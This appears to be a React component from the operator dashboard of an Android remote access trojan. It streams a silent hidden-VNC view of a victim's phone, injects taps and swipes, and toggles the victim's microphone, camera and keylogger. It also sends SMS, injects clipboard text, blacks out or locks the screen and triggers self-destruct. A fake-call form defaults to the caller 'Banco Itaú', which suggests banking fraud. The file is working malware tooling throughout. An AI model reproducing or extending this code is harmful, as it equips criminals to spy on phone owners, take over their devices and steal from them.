import { useRef, useEffect, useState, useCallback, useLayoutEffect } from 'react';

// ── Command groups ─────────────────────────────────────────────────────────────

const CMD_NAV = [
  { label: 'BACK',     icon: '◀',  cmd: 'BACK' },
  { label: 'HOME',     icon: '⌂',  cmd: 'HOME' },
  { label: 'RECENTS',  icon: '□',  cmd: 'RECENTS' },
  { label: 'NOTIF',    icon: '☰',  cmd: 'NOTIFICATIONS' },
  { label: 'QS',       icon: '⚙',  cmd: 'QUICK_SETTINGS' },
  { label: 'POWER',    icon: '⏻',  cmd: 'POWER_MENU' },
];

const CMD_SCREEN = [
  { label: 'BLACK ON',  cmd: 'BLACK_SCREEN_ON' },
  { label: 'BLACK OFF', cmd: 'BLACK_SCREEN_OFF' },
  { label: 'LOCK',      cmd: 'LOCK_DEVICE' },
  { label: 'WAKE',      cmd: 'WAKEUP' },
  { label: 'PERSIST',   cmd: 'SCREEN_PERSISTENCE' },
  { label: 'SNAP',      cmd: 'SNAP_SCREEN' },
];

const CMD_TOGGLES = [
  { label: 'MIC',     cmd: 'TOGGLE_MICROPHONE',   key: 'mic' },
  { label: 'CAM',     cmd: 'TOGGLE_CAMERA',        key: 'cam' },
  { label: 'KEYLOG',  cmd: 'TOGGLE_KEYLOGGER',     key: 'keylog' },
  { label: 'READER',  cmd: 'TOGGLE_SCREEN_READER', key: 'reader' },
];

const CMD_ADVANCED = [
  { label: 'KILL MODE',     cmd: 'TOGGLE_KILLER_MODE' },
  { label: 'VNC RESTART',   cmd: 'FORCE_RESTART_VNC' },
  { label: 'VIBRATE',       cmd: 'VIBRATE' },
  { label: 'ROM CONFIG',    cmd: 'CONFIGURE_ROM' },
  { label: 'RECONNECT',     cmd: 'RECONNECT_CONNECTION' },
  { label: 'SELF DESTRUCT', cmd: 'SELF_DESTRUCT', danger: true },
];

const CMD_VOL = [
  { label: '▲', cmd: 'VOLUME_UP' },
  { label: '▼', cmd: 'VOLUME_DOWN' },
];

// ── Component ──────────────────────────────────────────────────────────────────

export default function HvncView({ device, hvncHandlerRef }) {
  const canvasRef    = useRef(null);
  const imgRef       = useRef(null);
  const urlQueue     = useRef([]);
  const touchRef     = useRef({ down: false, x: 0, y: 0, t: 0 });
  const fpsRef       = useRef({ n: 0, t: Date.now() });
  const canvasSize   = useRef({ w: 350, h: 650 });

  const [fps,        setFps]        = useState(0);
  const [streaming,  setStreaming]  = useState(false);
  const [fullscreen, setFullscreen] = useState(false);
  const [quality,    setQuality]    = useState(60);
  const [toggles,    setToggles]    = useState({ mic: false, cam: false, keylog: false, reader: false });
  const [modal,      setModal]      = useState(null);
  const [modalVal,   setModalVal]   = useState({ text: '', phone: '', msg: '', pattern: '', pkg: '' });

  // ── Canvas + image pipeline ────────────────────────────────────────────────

  useEffect(() => {
    const img = new Image();
    imgRef.current = img;

    img.onload = () => {
      const canvas = canvasRef.current;
      if (!canvas) return;
      const ctx = canvas.getContext('2d');

      // Update canvas native size to match first frame dimensions
      if (img.naturalWidth && img.naturalHeight) {
        if (canvas.width  !== img.naturalWidth ||
            canvas.height !== img.naturalHeight) {
          canvas.width  = img.naturalWidth;
          canvas.height = img.naturalHeight;
          canvasSize.current = { w: img.naturalWidth, h: img.naturalHeight };
        }
      }

      ctx.drawImage(img, 0, 0);

      fpsRef.current.n++;
      const now = Date.now();
      if (now - fpsRef.current.t >= 1000) {
        setFps(fpsRef.current.n);
        fpsRef.current = { n: 0, t: now };
      }

      const old = urlQueue.current.shift();
      if (old) URL.revokeObjectURL(old);
      setStreaming(true);
    };

    return () => { img.src = ''; };
  }, []);

  // ── Binary frame handler ───────────────────────────────────────────────────

  const onFrame = useCallback((frameType, payload, fromDeviceId) => {
    // Only screen (0x01) renders here; camera (0x02) handled by CameraTab
    if (frameType !== 0x01) return;
    if (fromDeviceId && fromDeviceId !== device.id) return;

    const blob = new Blob([payload], { type: 'image/jpeg' });
    const url  = URL.createObjectURL(blob);
    urlQueue.current.push(url);
    if (imgRef.current) imgRef.current.src = url;
  }, [device.id]);

  // Register frame handler with parent App
  useEffect(() => {
    if (hvncHandlerRef) hvncHandlerRef.current = onFrame;
    return () => { if (hvncHandlerRef) hvncHandlerRef.current = null; };
  }, [onFrame, hvncHandlerRef]);

  // ── Send helper ────────────────────────────────────────────────────────────

  const send = useCallback((cmd) => {
    if (window.__ratSend) window.__ratSend(device.id, { type: cmd });
  }, [device.id]);

  const sendObj = useCallback((obj) => {
    if (window.__ratSend) window.__ratSend(device.id, obj);
  }, [device.id]);

  // ── VNC stream start / stop ────────────────────────────────────────────────

  const startVnc = () => {
    sendObj({ type: 'START_SILENT_VNC' });
    sendObj({ type: 'SET_SILENT_VNC_QUALITY', quality });
  };

  const stopVnc = () => {
    sendObj({ type: 'STOP_SILENT_VNC' });
    setStreaming(false);
    setFps(0);
  };

  // ── Canvas pointer events → gesture injection ──────────────────────────────

  const canvasCoords = (e) => {
    const canvas = canvasRef.current;
    if (!canvas) return { x: 0, y: 0 };
    const rect = canvas.getBoundingClientRect();
    const { w, h } = canvasSize.current;
    return {
      x: Math.round(((e.clientX - rect.left) / rect.width)  * w),
      y: Math.round(((e.clientY - rect.top)  / rect.height) * h),
    };
  };

  const onPointerDown = (e) => {
    e.preventDefault();
    const { x, y } = canvasCoords(e);
    touchRef.current = { down: true, x, y, t: Date.now() };
  };

  const onPointerUp = (e) => {
    e.preventDefault();
    if (!touchRef.current.down) return;
    const { x: x0, y: y0, t: t0 } = touchRef.current;
    const { x: x1, y: y1 } = canvasCoords(e);
    touchRef.current.down = false;

    const dx = x1 - x0;
    const dy = y1 - y0;
    const duration = Date.now() - t0;
    const dist = Math.sqrt(dx * dx + dy * dy);

    if (dist < 8) {
      // Tap
      if (duration > 500) {
        sendObj({ type: 'LONG_PRESS', x: x0, y: y0 });
      } else {
        sendObj({ type: 'TAP', x: x0, y: y0 });
      }
    } else {
      // Swipe
      sendObj({ type: 'SWIPE', x1: x0, y1: y0, x2: x1, y2: y1, duration: Math.max(duration, 100) });
    }
  };

  const onPointerMove = (e) => {
    // Only track for pinch/scroll in future; don't spam swipes on every move
  };

  // ── Toggle button state ────────────────────────────────────────────────────

  const toggleCmd = (item) => {
    const newState = !toggles[item.key];
    setToggles(prev => ({ ...prev, [item.key]: newState }));
    sendObj({ type: item.cmd, enabled: newState });
  };

  // ── Quality change ─────────────────────────────────────────────────────────

  const applyQuality = (q) => {
    setQuality(q);
    sendObj({ type: 'SET_SILENT_VNC_QUALITY', quality: q });
  };

  // ── Modals ─────────────────────────────────────────────────────────────────

  const submitModal = () => {
    switch (modal) {
      case 'type':
        if (modalVal.text) sendObj({ type: 'TYPE', text: modalVal.text });
        break;
      case 'sms':
        if (modalVal.phone && modalVal.msg)
          sendObj({ type: 'SEND_SMS', phone: modalVal.phone, message: modalVal.msg });
        break;
      case 'app':
        if (modalVal.pkg) sendObj({ type: 'OPEN_APP', package: modalVal.pkg });
        break;
      case 'inject_clipboard':
        if (modalVal.text) sendObj({ type: 'INJECT_CLIPBOARD', text: modalVal.text });
        break;
      case 'fake_call':
        sendObj({ type: 'FAKE_CALL', callerName: modalVal.text || 'Banco Itaú', number: modalVal.phone || '+5511999990000' });
        break;
    }
    setModal(null);
    setModalVal({ text: '', phone: '', msg: '', pattern: '', pkg: '' });
  };

  // ── Fullscreen toggle ──────────────────────────────────────────────────────

  const containerRef = useRef(null);
  const toggleFullscreen = () => {
    if (!document.fullscreenElement) {
      containerRef.current?.requestFullscreen();
      setFullscreen(true);
    } else {
      document.exitFullscreen();
      setFullscreen(false);
    }
  };

  useEffect(() => {
    const handler = () => setFullscreen(!!document.fullscreenElement);
    document.addEventListener('fullscreenchange', handler);
    return () => document.removeEventListener('fullscreenchange', handler);
  }, []);

  // ── Render ─────────────────────────────────────────────────────────────────

  return (
    <div style={S.root} ref={containerRef}>

      {/* Top controls bar */}
      <div style={S.topBar}>

        {/* Stream controls */}
        <div style={S.group}>
          <Btn active={streaming} onClick={startVnc} color="#00d26a">
            {streaming ? `LIVE ${fps}fps` : 'START VNC'}
          </Btn>
          <Btn onClick={stopVnc} color="#f44">STOP</Btn>
        </div>

        {/* Quality */}
        <div style={S.group}>
          <label style={S.label}>Q</label>
          {[15, 30, 60, 85].map(q => (
            <Btn key={q} active={quality === q} onClick={() => applyQuality(q)} size="sm">
              {q}
            </Btn>
          ))}
        </div>

        {/* Volume */}
        <div style={S.group}>
          {CMD_VOL.map(c => (
            <Btn key={c.cmd} onClick={() => send(c.cmd)} size="sm">{c.label}</Btn>
          ))}
        </div>

        {/* Fullscreen */}
        <Btn onClick={toggleFullscreen} size="sm">{fullscreen ? '⊠' : '⊞'}</Btn>
      </div>

      {/* Main area */}
      <div style={S.body}>

        {/* Canvas */}
        <div style={S.canvasWrap}>
          <canvas
            ref={canvasRef}
            width={350} height={650}
            style={S.canvas}
            onPointerDown={onPointerDown}
            onPointerUp={onPointerUp}
            onPointerMove={onPointerMove}
            onContextMenu={e => e.preventDefault()}
          />
          {!streaming && (
            <div style={S.noStream}>
              <span style={{ color: '#333', fontSize: 13 }}>No stream</span>
              <Btn onClick={startVnc} color="#00d26a" size="sm">START</Btn>
            </div>
          )}
        </div>

        {/* Right controls panel */}
        <div style={S.controls}>

          {/* Nav */}
          <Section label="NAV">
            <div style={S.btnGrid}>
              {CMD_NAV.map(c => (
                <Btn key={c.cmd} onClick={() => send(c.cmd)} size="sm" title={c.label}>
                  {c.icon}
                </Btn>
              ))}
            </div>
          </Section>

          {/* Screen */}
          <Section label="SCREEN">
            <div style={S.btnGrid}>
              {CMD_SCREEN.map(c => (
                <Btn key={c.cmd} onClick={() => send(c.cmd)} size="sm">{c.label}</Btn>
              ))}
            </div>
          </Section>

          {/* Toggles */}
          <Section label="TOGGLE">
            <div style={S.btnGrid}>
              {CMD_TOGGLES.map(c => (
                <Btn
                  key={c.cmd}
                  onClick={() => toggleCmd(c)}
                  active={toggles[c.key]}
                  size="sm"
                >{c.label}</Btn>
              ))}
            </div>
          </Section>

          {/* Input */}
          <Section label="INPUT">
            <div style={S.btnGrid}>
              <Btn onClick={() => setModal('type')}      size="sm">TYPE</Btn>
              <Btn onClick={() => setModal('inject_clipboard')} size="sm">CLIP</Btn>
              <Btn onClick={() => setModal('sms')}       size="sm">SMS</Btn>
              <Btn onClick={() => setModal('app')}       size="sm">APP</Btn>
              <Btn onClick={() => setModal('fake_call')} size="sm">FCALL</Btn>
            </div>
          </Section>

          {/* Advanced */}
          <Section label="ADVANCED">
            <div style={S.btnGrid}>
              {CMD_ADVANCED.map(c => (
                <Btn
                  key={c.cmd}
                  onClick={() => send(c.cmd)}
                  color={c.danger ? '#f44' : undefined}
                  size="sm"
                >{c.label}</Btn>
              ))}
            </div>
          </Section>

        </div>
      </div>

      {/* Modal overlay */}
      {modal && (
        <div style={S.modalBg} onClick={() => setModal(null)}>
          <div style={S.modal} onClick={e => e.stopPropagation()}>
            <div style={S.modalTitle}>{modal.toUpperCase().replace('_', ' ')}</div>

            {(modal === 'type' || modal === 'inject_clipboard') && (
              <textarea
                style={S.ta}
                placeholder="Text to inject…"
                value={modalVal.text}
                onChange={e => setModalVal(p => ({ ...p, text: e.target.value }))}
                autoFocus
                rows={4}
              />
            )}

            {modal === 'sms' && (
              <>
                <input style={S.inp} placeholder="+55 phone" value={modalVal.phone}
                  onChange={e => setModalVal(p => ({ ...p, phone: e.target.value }))} />
                <textarea style={S.ta} placeholder="Message" value={modalVal.msg}
                  onChange={e => setModalVal(p => ({ ...p, msg: e.target.value }))} rows={3} />
              </>
            )}

            {modal === 'app' && (
              <input style={S.inp} placeholder="com.package.name" value={modalVal.pkg}
                onChange={e => setModalVal(p => ({ ...p, pkg: e.target.value }))} autoFocus />
            )}

            {modal === 'fake_call' && (
              <>
                <input style={S.inp} placeholder="Caller name" value={modalVal.text}
                  onChange={e => setModalVal(p => ({ ...p, text: e.target.value }))} />
                <input style={S.inp} placeholder="Phone number" value={modalVal.phone}
                  onChange={e => setModalVal(p => ({ ...p, phone: e.target.value }))} />
              </>
            )}

            <div style={{ display: 'flex', gap: 8, marginTop: 8 }}>
              <Btn onClick={submitModal} color="#00d26a">SEND</Btn>
              <Btn onClick={() => setModal(null)}>CANCEL</Btn>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

// ── Sub-components ─────────────────────────────────────────────────────────────

function Section({ label, children }) {
  return (
    <div style={{ marginBottom: 10 }}>
      <div style={{ fontSize: 9, color: '#333', letterSpacing: 1.5, marginBottom: 5,
        textTransform: 'uppercase', padding: '0 2px' }}>
        {label}
      </div>
      {children}
    </div>
  );
}

function Btn({ onClick, children, active, color, size, title, danger }) {
  const c = color || (active ? '#00d26a' : '#2a2a3a');
  return (
    <button
      onClick={onClick}
      title={title}
      style={{
        background: active ? c + '22' : 'transparent',
        border: `1px solid ${active ? c : '#222'}`,
        borderRadius: 4,
        color: active ? c : '#666',
        fontSize: size === 'sm' ? 10 : 12,
        padding: size === 'sm' ? '3px 7px' : '5px 12px',
        cursor: 'pointer',
        fontFamily: 'inherit',
        transition: 'all .12s',
        whiteSpace: 'nowrap',
        letterSpacing: .5,
      }}
      onMouseOver={e => {
        e.currentTarget.style.color    = c;
        e.currentTarget.style.border   = `1px solid ${c}`;
        e.currentTarget.style.background = c + '18';
      }}
      onMouseOut={e => {
        e.currentTarget.style.color    = active ? c : '#666';
        e.currentTarget.style.border   = `1px solid ${active ? c : '#222'}`;
        e.currentTarget.style.background = active ? c + '22' : 'transparent';
      }}
    >
      {children}
    </button>
  );
}

// ── Styles ─────────────────────────────────────────────────────────────────────

const S = {
  root: {
    flex: 1,
    display: 'flex',
    flexDirection: 'column',
    background: '#080810',
    overflow: 'hidden',
    minHeight: 0,
  },
  topBar: {
    display: 'flex',
    alignItems: 'center',
    gap: 10,
    padding: '6px 12px',
    borderBottom: '1px solid #1a1a24',
    background: '#0a0a14',
    flexShrink: 0,
    flexWrap: 'wrap',
  },
  group: {
    display: 'flex',
    alignItems: 'center',
    gap: 4,
  },
  label: {
    fontSize: 10,
    color: '#333',
    marginRight: 2,
    fontFamily: 'monospace',
  },
  body: {
    flex: 1,
    display: 'flex',
    overflow: 'hidden',
    minHeight: 0,
  },
  canvasWrap: {
    flex: 1,
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    background: '#040408',
    position: 'relative',
    overflow: 'hidden',
  },
  canvas: {
    maxWidth: '100%',
    maxHeight: '100%',
    objectFit: 'contain',
    imageRendering: 'pixelated',
    cursor: 'crosshair',
    touchAction: 'none',
    display: 'block',
  },
  noStream: {
    position: 'absolute',
    inset: 0,
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
    justifyContent: 'center',
    gap: 12,
  },
  controls: {
    width: 200,
    flexShrink: 0,
    borderLeft: '1px solid #1a1a24',
    padding: '10px 8px',
    overflowY: 'auto',
    background: '#0a0a14',
    scrollbarWidth: 'thin',
    scrollbarColor: '#1a1a24 transparent',
  },
  btnGrid: {
    display: 'flex',
    flexWrap: 'wrap',
    gap: 4,
  },
  modalBg: {
    position: 'absolute',
    inset: 0,
    background: 'rgba(0,0,0,.7)',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    zIndex: 200,
  },
  modal: {
    background: '#0f0f1a',
    border: '1px solid #1e1e2a',
    borderRadius: 8,
    padding: 20,
    minWidth: 280,
    maxWidth: '90vw',
    display: 'flex',
    flexDirection: 'column',
    gap: 10,
  },
  modalTitle: {
    fontSize: 12,
    color: '#00d26a',
    fontWeight: 700,
    letterSpacing: 1,
    fontFamily: 'monospace',
    marginBottom: 4,
  },
  inp: {
    background: '#080810',
    border: '1px solid #222',
    borderRadius: 4,
    color: '#ccc',
    fontSize: 13,
    padding: '7px 10px',
    fontFamily: 'monospace',
    outline: 'none',
    width: '100%',
    boxSizing: 'border-box',
  },
  ta: {
    background: '#080810',
    border: '1px solid #222',
    borderRadius: 4,
    color: '#ccc',
    fontSize: 13,
    padding: '7px 10px',
    fontFamily: 'monospace',
    outline: 'none',
    width: '100%',
    boxSizing: 'border-box',
    resize: 'vertical',
  },
};
